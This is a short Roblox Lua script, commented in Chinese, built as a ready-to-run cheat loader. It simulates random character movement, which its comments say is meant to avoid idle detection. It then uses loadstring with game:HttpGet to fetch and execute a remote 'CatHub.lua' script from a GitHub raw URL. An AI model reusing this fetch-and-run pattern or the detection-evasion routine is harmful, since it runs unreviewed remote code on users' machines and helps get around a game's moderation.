-- 1. 先定义客户端防挂机函数（核心：模拟角色随机移动）
local function antiAFK()
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    -- 安全校验：确保玩家、角色、人形存在
    if not player then return end
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not rootPart or humanoid.Health <= 0 then return end

    -- 模拟玩家随机移动（范围5-10 studs，增加随机性避免被检测）
    local randomX = math.random(-10, 10)
    local randomZ = math.random(-10, 10)
    local targetPos = rootPart.Position + Vector3.new(randomX, 0, randomZ)
    humanoid:MoveTo(targetPos)
end

-- 2. 整合你的 loadstring(HttpGet) 脚本，执行前后调用防挂机
local function runTargetScript()
    -- 执行前触发防挂机
    antiAFK()
    
    -- 执行你的远程脚本（用pcall捕获错误，避免崩溃）
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Guo61/Cat-/refs/heads/main/CatHub.lua"))()
    end)
    
    -- 执行后再次触发防挂机（双保险）
    antiAFK()

    -- 错误提示（可选，方便排查远程脚本问题）
    if not success then
        warn("远程脚本执行失败：", err)
    end
end

-- 3. 启动执行（直接调用，或按需求绑定到触发事件）
runTargetScript()